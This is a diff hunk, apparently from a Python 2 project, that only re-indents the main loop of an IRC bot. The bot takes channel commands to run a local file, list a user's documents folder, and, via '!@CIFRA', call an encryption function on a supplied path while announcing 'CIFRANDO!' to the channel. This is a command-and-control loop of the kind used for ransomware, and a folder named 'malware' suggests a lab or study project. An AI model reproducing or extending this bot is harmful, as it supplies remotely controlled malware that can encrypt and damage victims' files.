@@ -107,27 +107,27 @@ irc.send("NICK "+ botnick +"\n")
 irc.send("JOIN "+ channel +"\n")
 
 while 1:
-     try:
-         msg=irc.recv(2048)
-         #print(msg)
-     except Exception:
-          pass
-     if msg.find("PING")!=-1:
-         irc.send("PRIVMSG "+channel+" :PONG!\r\n")
-     if msg.find("!@PING")!=-1:
-         irc.send("PRIVMSG "+channel+" :PONG!\r\n")
-     if msg.lower().find("!@hi")!=-1:
-         irc.send("PRIVMSG "+channel+" :Hello!\r\n")
-     if msg.find("!@run")!=-1:
-         subprocess.call(['C:\\test.txt'])
-     if msg.find("!@users")!=-1:
-         print os.listdir('C:\\Users\\malware\\Documents')
-  	if msg.find("!@CIFRA") != -1:
-		irc.send("PRIVMSG "+channel+" :CIFRANDO!\r\n")
-		msg2=msg.split(' ')
-		try:
-			Cifra(msg2[4].replace('\r\n',''))
-		except Exception as e:
-			irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
+    try:
+        msg=irc.recv(2048)
+        #print(msg)
+    except Exception:
+        pass
+    if msg.find("PING")!=-1:
+        irc.send("PRIVMSG "+channel+" :PONG!\r\n")
+    if msg.find("!@PING")!=-1:
+        irc.send("PRIVMSG "+channel+" :PONG!\r\n")
+    if msg.lower().find("!@hi")!=-1:
+        irc.send("PRIVMSG "+channel+" :Hello!\r\n")
+    if msg.find("!@run")!=-1:
+        subprocess.call(['C:\\test.txt'])
+    if msg.find("!@users")!=-1:
+        print os.listdir('C:\\Users\\malware\\Documents')
+    if msg.find("!@CIFRA") != -1:
+        irc.send("PRIVMSG "+channel+" :CIFRANDO!\r\n")
+        msg2=msg.split(' ')
+        try:
+            Cifra(msg2[4].replace('\r\n',''))
+        except Exception as e:
+            irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
      # Limpio el msg
      msg=""
